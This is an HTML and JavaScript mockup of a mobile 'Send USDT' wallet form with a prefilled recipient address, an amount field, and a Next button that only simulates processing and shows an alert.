<!DOCTYPE html>
<html>
<head>
  <title>Send USDT</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      font-family: sans-serif;
      background: #fff;
      margin: 0;
      padding: 0;
      color: #000;
      height: 100%;
      display: flex;
      flex-direction: column;
    }

    .container {
      flex: 1;
      padding: 16px;
      display: flex;
      flex-direction: column;
    }

    label {
      font-size: 14px;
      color: #555;
      display: block;
      margin: 20px 0 8px;
    }

    .input-box {
      display: flex;
      align-items: center;
      border: 1px solid #ccc;
      border-radius: 8px;
      padding: 0 10px;
      position: relative;
    }

    .input-box input {
      border: none;
      outline: none;
      padding: 14px;
      font-size: 16px;
      width: 100%;
    }

    .input-box .clear-btn {
      background: none;
      border: none;
      font-size: 20px;
      color: #aaa;
      cursor: pointer;
      margin-right: 8px;
    }

    .input-box .paste-btn {
      background: none;
      border: none;
      color: #0052ff;
      font-weight: bold;
      cursor: pointer;
      padding: 0 8px;
    }

    .amount-section {
      display: flex;
      align-items: center;
      border: 1px solid #ccc;
      border-radius: 8px;
      margin-top: 8px;
    }

    .amount-section input {
      border: none;
      outline: none;
      padding: 14px;
      font-size: 16px;
      width: 100%;
    }

    .amount-section span, .amount-section .max-btn {
      padding: 0 12px;
      color: #0052ff;
      font-weight: bold;
      font-size: 14px;
    }

    .converted {
      margin-top: 10px;
      color: #888;
      font-size: 14px;
    }

    .footer {
      padding: 16px;
      background: #fff;
      box-shadow: 0 -1px 5px rgba(0,0,0,0.1);
    }

    .button {
      background-color: #0052ff;
      color: white;
      padding: 16px;
      border: none;
      width: 100%;
      font-size: 18px;
      font-weight: bold;
      border-radius: 20px;
      cursor: pointer;
      transition: background 0.3s ease;
      position: relative;
    }

    .button.loading {
      background-color: #e0e7ff;
      color: #0052ff;
    }

    .button.loading::before {
      content: "Processing...";
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      color: #0052ff;
      font-size: 16px;
      font-weight: bold;
    }

    .button.loading span {
      visibility: hidden;
    }
  </style>
</head>
<body>

  <div class="container">
    <label>Address or Domain Name</label>
    <div class="input-box">
      <input type="text" id="address" value="0x3BA4c387f786bFEE076A58914F5Bd38d668B42c3">
      <button class="clear-btn" onclick="document.getElementById('address').value = ''">&times;</button>
      <button class="paste-btn" onclick="navigator.clipboard.readText().then(text => document.getElementById('address').value = text)">Paste</button>
    </div>

    <label>Amount</label>
    <div class="amount-section">
      <input type="number" id="amount" placeholder="USDT Amount">
      <span>USDT</span>
      <span class="max-btn" onclick="setMax()">Max</span>
    </div>

    <div class="converted" id="converted">= $0.00</div>
  </div>

  <div class="footer">
    <button class="button" id="nextBtn" onclick="nextStep()"><span>Next</span></button>
  </div>

  <script>
    function setMax() {
      const maxAmount = 100; // Static for now
      document.getElementById('amount').value = maxAmount;
      document.getElementById('converted').innerText = `= $${maxAmount.toFixed(2)}`;
    }

    function nextStep() {
      const btn = document.getElementById('nextBtn');
      const addr = document.getElementById('address').value;
      const amount = document.getElementById('amount').value;

      if (!addr || !amount) {
        alert("Please fill all fields.");
        return;
      }

      btn.classList.add("loading");

      setTimeout(() => {
        btn.classList.remove("loading");
        alert(`Proceeding to transfer ${amount} USDT to ${addr}`);
      }, 2000);
    }
  </script>

</body>
</html>
